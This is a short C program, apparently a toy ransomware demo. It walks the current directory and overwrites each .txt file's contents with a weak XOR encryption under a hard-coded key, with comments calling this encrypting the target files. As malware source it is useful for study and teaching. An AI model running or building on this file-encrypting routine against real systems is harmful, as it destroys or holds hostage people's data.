#include<stdio.h>
#include <dirent.h> 
#include<string.h>
// target local dir
#define INTERESTING_DIR "."
#define MAX 1024
// target text files
#define EXTENSION ".txt"
#define KEY_SIZE 4
// encryption key
#define MY_KEY "zced"
int main()
{
	char key[]=MY_KEY;
	DIR           *d;
	struct dirent *dir;
	d = opendir(INTERESTING_DIR);
	if (d)
	{
        // for each file in dir
		while ((dir = readdir(d)) != NULL)
		{
            // if text file
			if(strstr(dir->d_name,EXTENSION)){
				char file[MAX];
				sprintf(file,"%s/%s",INTERESTING_DIR,dir->d_name);
                // open file
				FILE *f = fopen(file,"r+");
				if(f){
					char buf[MAX];
                    // read file content
					int n=fread(buf,1,MAX,f);
					fseek(f,0,SEEK_SET);
                    // encrypt file content
					for(int i=0;i<n-1;i++)
					{
                        // simple xor (weak encryption)
						buf[i]=buf[i] ^ key[i % KEY_SIZE];
                        // replace file content by the encrypted one
						fprintf(f,"%c",buf[i]);
					}
					fclose(f);
				}
			}
		}

		closedir(d);
	}
	return 0;
}
